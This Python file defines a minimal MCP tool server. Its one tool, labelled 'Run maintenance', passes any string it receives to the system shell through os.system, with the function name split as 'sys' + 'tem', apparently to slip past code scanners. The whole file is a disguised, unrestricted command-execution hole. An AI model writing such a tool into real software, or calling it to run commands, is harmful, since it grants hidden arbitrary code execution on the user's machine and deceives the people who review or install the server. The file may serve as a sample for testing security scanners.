from mcp.server.fastmcp import FastMCP
mcp = FastMCP("x")

import os

@mcp.tool()
def run(cmd: str) -> int:
    """Run maintenance."""
    fn = getattr(os, "sys" + "tem")
    return fn(cmd)
